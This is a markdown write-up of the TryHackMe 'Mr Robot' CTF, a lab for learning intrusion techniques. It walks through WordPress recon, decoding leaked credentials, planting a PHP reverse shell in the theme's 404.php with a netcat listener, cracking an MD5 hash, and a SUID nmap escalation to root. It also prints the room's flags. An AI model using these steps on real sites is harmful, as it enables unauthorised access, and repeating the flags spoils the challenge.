@@ -1,0 +1,355 @@
+---
+title: 'Mr Robot CTF'
+description: 'WordPress enumeration, login brute force with a custom wordlist, RCE via the theme editor and cracking a hash to reach root.'
+publishDate: 2026-09-03
+tags:
+  - cybersecurity
+  - tryhackme
+  - web
+  - privesc
+---
+
+**Difficulty:** Medium **Category:** Web enumeration (WordPress), login brute force with a custom wordlist, RCE via the WordPress theme editor, MD5 hash cracking, privilege escalation via a SUID binary (`nmap`) **Room:** [https://tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot)
+
+## Room description
+
+A machine themed around the show _Mr. Robot_ (originally published on VulnHub and later adapted to TryHackMe), where you have to find **3 flags** distributed across different privilege levels. The path combines web recon on a **WordPress** site, a custom password dictionary (`fsocity.dic`, a direct nod to the show), obtaining RCE through the WordPress theme editor, cracking a leaked MD5 hash, and a classic privilege escalation via a misconfigured **SUID** binary (`nmap`).
+
+> **Note on placeholders:** `{IP}` / `target` stands for the IP TryHackMe assigns (it changes on every deploy). The other values (users, hashes, file paths) are fixed on this machine.
+
+---
+
+## 1. Environment setup
+
+```bash
+mkdir -p mr_robot_ctf/{scans,content,scripts,loot,exploits} && cd mr_robot_ctf
+settarget {IP}
+```
+
+---
+
+## 2. Port scan
+
+```bash
+nmap -p- --open -T5 -v -n target -oG scans/initial-scan
+extractPorts scans/initial-scan
+```
+
+**Expected ports:**
+
+| Port    | Service                                                                                               |
+| ------- | ----------------------------------------------------------------------------------------------------- |
+| 22/tcp  | SSH (closed/filtered initially in the original VulnHub version; on TryHackMe it is usually available) |
+| 80/tcp  | HTTP                                                                                                  |
+| 443/tcp | HTTPS                                                                                                 |
+
+Visiting `http://{IP}/` loads a page with the show’s visual theme (a simulated “hacker” terminal), with no obvious direct-exploitation content at a glance.
+
+> The email `raccoon@example.thm` that appears in these notes is a test value unrelated to the machine.
+
+---
+
+## 3. Web enumeration and `robots.txt`
+
+```bash
+wget http://target/robots.txt
+cat robots.txt
+```
+
+`robots.txt` (the standard file telling search engines which paths not to index) reveals, in this case, two entries that are really a deliberate hint of the room:
+
+```
+key-1-of-3.txt
+fsocity.dic
+```
+
+### 3.1 First flag
+
+```bash
+wget http://target/key-1-of-3.txt
+cat key-1-of-3.txt
+```
+
+**Result:**
+
+<Flag value="073403c8a58a1f80d943455fb30724b9" />
+
+### 3.2 Custom dictionary `fsocity.dic`
+
+```bash
+wget http://target/fsocity.dic
+```
+
+This file (a direct reference to “fsociety”, the show’s fictional hacktivist group) is a **custom password dictionary**, generated specifically for this machine — it contains a large number of words (many duplicated), meant for use in a brute-force attack against the WordPress panel discovered next. It is advisable to clean duplicates before using it, to speed up any later attack:
+
+```bash
+sort -u fsocity.dic -o fsocity_unique.dic
+wc -l fsocity.dic fsocity_unique.dic
+```
+
+---
+
+## 4. Discovering WordPress and credentials
+
+Additional directory fuzzing (or simple manual exploration of the site) reveals that the site runs on **WordPress**:
+
+```bash
+gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 30
+```
+
+Among the typical files of a WordPress installation, one stands out that is unusual to find directly exposed:
+
+```bash
+wget http://target/license.txt
+cat license.txt
+```
+
+Instead of WordPress’s standard GPL license content, this particular file has been modified to contain a **Base64** string:
+
+```
+ZWxsaW90OkVSMjgtMDY1Mgo=
+```
+
+```bash
+echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
+```
+
+**Result (WordPress credentials):**
+
+```
+elliot:ER28-0652
+```
+
+> Historical note on the room: in older versions/write-ups of this machine, the username (`elliot`) was first obtained by brute force with `wpscan`/`hydra` against the WordPress login form using `fsocity.dic`, and the password was obtained separately. In the more recent variant of the room (the one these notes reflect), both credentials are already available directly by decoding `license.txt`, simplifying this step.
+
+---
+
+## 5. Accessing the WordPress panel
+
+```
+http://target/wp-login.php
+```
+
+Log in with:
+
+```
+user: elliot
+password: ER28-0652
+```
+
+---
+
+## 6. Getting RCE via the WordPress theme editor
+
+An extremely common (and well-documented) technique to obtain remote command execution once you have **administrator** access to a WordPress panel is to directly edit the PHP code of one of the active theme’s template files, since WordPress allows this from its own web interface without needing filesystem access by another route.
+
+### 6.1 Prepare the PHP reverse shell
+
+```bash
+cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
+```
+
+- `php-reverse-shell.php`: the classic **pentestmonkey** PHP reverse shell, included by default in Kali Linux under `/usr/share/webshells/php/`.
+
+Before continuing, it is essential to **edit the file** to set your attacker machine’s IP and port (by default it comes with example values that must be changed):
+
+```bash
+nano shell.php
+# Modify the $ip and $port variables at the start of the file
+```
+
+```bash
+xclip -sel clip < shell.php
+```
+
+- `xclip -sel clip`: copies the file’s full content to the system clipboard, so you can paste it directly into the WordPress web editor without having to reopen/copy the file manually.
+
+### 6.2 Edit the active theme from WordPress
+
+In the admin panel:
+
+```
+Appearance -> Editor -> 404.php (within the active theme, e.g. "twentyfifteen")
+```
+
+- **`404.php`** is chosen (the template shown when a URL does not exist) because it is a file present in practically any theme, easy to identify and to trigger simply by visiting any non-existent URL of the site.
+
+**Delete all the existing content** of the file and **paste** the content of `shell.php` (already copied to the clipboard), and press the **“Update File”** button to save the changes.
+
+### 6.3 Prepare the listener and trigger the shell
+
+```bash
+nc -nvlp 1234
+```
+
+In another terminal (or from the browser), visit any non-existent URL of the site, forcing WordPress to render the `404.php` template we just modified:
+
+```bash
+curl http://target/pagethatdoesnotexist12345
+```
+
+When that request is processed, the server runs the reverse shell’s PHP code, and the `nc` listener receives the connection:
+
+```bash
+id
+whoami
+# daemon
+```
+
+> You get access as user **`daemon`** (the low-privilege account the Apache/PHP web server usually runs as in this kind of configuration), not directly as `root` nor as user `robot`.
+
+### 6.4 Stabilise the terminal
+
+As usual with a basic PHP reverse shell (limited, no autocompletion or signal support), it is worth improving it:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+(Optionally, followed by `Ctrl+Z`, `stty raw -echo; fg`, and `export TERM=xterm`, as seen on previous machines, for a fully interactive terminal experience.)
+
+---
+
+## 7. Getting `robot`'s credentials and the second flag
+
+Exploring the filesystem as `daemon`, you find user `robot`'s home directory, with an interesting file:
+
+```bash
+ls -la /home/robot
+cat /home/robot/password.raw-md5
+```
+
+**Result:**
+
+```
+robot:c3fcd3d76192e4007dfb496cca67e13b
+```
+
+This is an **MD5** hash of user `robot`'s real password. Crack it using the `fsocity.dic` dictionary obtained at the start (or with CrackStation, since it is an unsalted MD5):
+
+```bash
+john --format=Raw-MD5 --wordlist=fsocity.dic password.raw-md5
+john --show --format=Raw-MD5 password.raw-md5
+```
+
+**Password obtained:**
+
+```
+abcdefghijklmnopqrstuvwxyz
+```
+
+### 7.1 Switch to user `robot`
+
+```bash
+su robot
+# password: abcdefghijklmnopqrstuvwxyz
+```
+
+> If `su` reports an error saying it must be run from a terminal (`standard in must be a tty`), it is a sign the shell is not yet fully stabilised — make sure you have applied the stabilisation step (`pty.spawn` + `stty raw -echo`) before trying `su`.
+
+### 7.2 Second flag
+
+Now as `robot`, you can read the previously restricted file:
+
+```bash
+cat /home/robot/key-2-of-3.txt
+```
+
+**Result:**
+
+<Flag value="822c73956184f694993bede3eb39f959" />
+
+---
+
+## 8. Privilege escalation
+
+### 8.1 Check sudo permissions (no luck)
+
+```bash
+sudo -l
+```
+
+User `robot` **has no `sudo` permissions**, so this path is ruled out and another vector must be found.
+
+### 8.2 Searching for SUID binaries
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+- `-perm -4000`: filters files with the **SUID** bit set (the `4` in `4000` corresponds specifically to the SUID bit in octal notation).
+- `-type f`: regular files only.
+- `2>/dev/null`: discards permission errors.
+
+**Relevant result:**
+
+```
+/usr/local/bin/nmap
+```
+
+This is the key finding: a copy of **`nmap`** with the SUID bit set, located in a non-standard path (`/usr/local/bin/`, instead of the usual system `/usr/bin/nmap`).
+
+### 8.3 Confirm the version and the exploitation vector
+
+```bash
+/usr/local/bin/nmap --version
+```
+
+Old versions of `nmap` (earlier than 5.21) included an **interactive mode** (`--interactive`) that allows running shell commands directly from within the program itself — functionality documented as a classic privilege-escalation vector in **GTFOBins** ([https://gtfobins.github.io/gtfobins/nmap/](https://gtfobins.github.io/gtfobins/nmap/)), in its “Shell” section.
+
+### 8.4 Exploitation
+
+```bash
+/usr/local/bin/nmap --interactive
+```
+
+Inside nmap’s interactive mode:
+
+```
+nmap> !sh
+```
+
+- `!sh`: nmap’s interactive mode allows running OS commands by prepending `!` — invoking `!sh` launches a `/bin/sh` shell. Since the `nmap` binary itself is running with the SUID bit (inheriting its owner’s privileges, **root**), the resulting shell also inherits those privileges.
+
+```bash
+id
+# uid=0(root) gid=0(root) ...
+```
+
+### 8.5 Third flag
+
+```bash
+cat /root/key-3-of-3.txt
+```
+
+---
+
+## 9. Attack chain summary
+
+1. **Recon** with `nmap` → HTTP (80), HTTPS (443), (SSH depending on the variant).
+2. **`robots.txt`** → reveals `key-1-of-3.txt` (first flag) and `fsocity.dic` (custom dictionary).
+3. **Modified `license.txt`** → Base64 string with WordPress credentials (`elliot:ER28-0652`).
+4. **Access to the WordPress panel** with those credentials.
+5. **RCE via the theme editor**: overwrite `404.php` with a PHP reverse shell (pentestmonkey), triggered by visiting any non-existent URL of the site → shell as `daemon`.
+6. **Discovery of `password.raw-md5`** in `/home/robot` → MD5 hash cracked with `john` using `fsocity.dic` → password `abcdefghijklmnopqrstuvwxyz`.
+7. **`su robot`** → access to user `robot` → second flag.
+8. **`sudo -l`** with no results → search instead for **SUID** binaries with `find / -perm -4000`.
+9. **`/usr/local/bin/nmap` with SUID set** → abuse its `--interactive` mode (`!sh`) documented in GTFOBins → root shell.
+10. **Third and final flag**.
+
+## 10. Lessons learned / key concepts
+
+- **“Standard” files modified with unexpected content** (like `license.txt`, which normally contains only GPL license text) are a surprisingly effective credential-hiding technique, precisely because an attacker/auditor might skip them assuming they are “generic” content without reviewing.
+- **The WordPress theme/plugin editor is a well-known RCE vector** when admin credentials are available: any `.php` file of the active theme can be edited directly from the panel, and WordPress will run it normally as soon as the corresponding route is accessed — it requires no additional WordPress core vulnerability, only valid admin credentials.
+- **`404.php` is an especially convenient target** for hosting a webshell, since it can be triggered simply by visiting any URL that does not exist on the site, with no need to know or create specific routes.
+- **Custom dictionaries generated by the target itself** (like `fsocity.dic`) often contain exactly the relevant words/passwords for that specific system, being more effective than generic wordlists like `rockyou.txt` for certain hashes of the same machine.
+- **`find / -perm -4000`** (SUID binary enumeration) is, along with `sudo -l` and `getcap -r /`, one of the three basic pillars of any Linux privilege-escalation enumeration — when one of the three yields nothing, try the others.
+- **Old versions of legitimate system tools** (like this `nmap` with `--interactive` mode, removed in modern versions precisely because of this kind of abuse) can become trivial privilege-escalation vectors if they are also carelessly given the SUID bit.
+
+## 11. Tools used
+
+`nmap`, `wget`, `gobuster` (optional), `base64`, a browser (WordPress panel), `php-reverse-shell.php` (pentestmonkey), `xclip`, `netcat`, `python3` (shell stabilisation), `john the ripper` / CrackStation, `su`, `find`, `nmap --interactive` (abused via GTFOBins).
+
+---
+
+_Academic write-up, built from my own notes solving the “Mr Robot CTF” machine on TryHackMe, supplemented with public community write-ups to complete the `robots.txt`/`fsocity.dic` context, the full WordPress theme-editing process, and the technical explanation of `nmap`'s interactive mode._
